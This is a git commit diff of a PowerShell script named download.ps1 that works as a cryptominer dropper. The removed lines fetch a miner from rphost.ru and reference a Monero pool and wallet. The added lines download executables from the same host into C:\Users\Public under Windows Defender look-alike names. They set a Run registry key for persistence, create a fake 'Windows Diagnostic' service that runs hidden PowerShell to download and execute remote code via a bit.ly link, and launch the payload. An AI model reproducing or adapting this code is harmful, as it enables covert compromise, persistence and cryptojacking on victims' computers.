fff8f7998d0225a6cf907912bff30ad55cc048f7
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-30 12:22:34 +0500

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,2 +1,19 @@
-(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/xmrx64.exe","C:\Users\Public\MSASC.exe")
-#start-process -FilePath 'C:\Users\Admin\mine.exe' -ArgumentList "-o pool.supportxmr.com:3333 -u 4Ahg96ZKa14MkPbqN3mFBH4EYJp2KBwwY61GtZTN5zCDiGT2dNDnkTXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm43Nf7Yn -p TEST --donate-level=1 -B"
+$n = (Get-WmiObject -class Win32_processor).NumberOfCores
+switch ($n)
+{
+        1 {
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
+		(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_1.signed","C:\Users\Public\MSASCuiL.exe")
+		New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
+	  New-Service -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2olWimV');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
+    start-process -FilePath 'C:\Users\Public\MSASCuiL.exe'
+		Exit
+		} 
+        2 
+		{
+		write-host "Two cores"          
+		}
+        3 { write-host "Three cores"        }
+        4 { write-host "Two cores"          }
+  default { write-host "$n cores"           }
+}
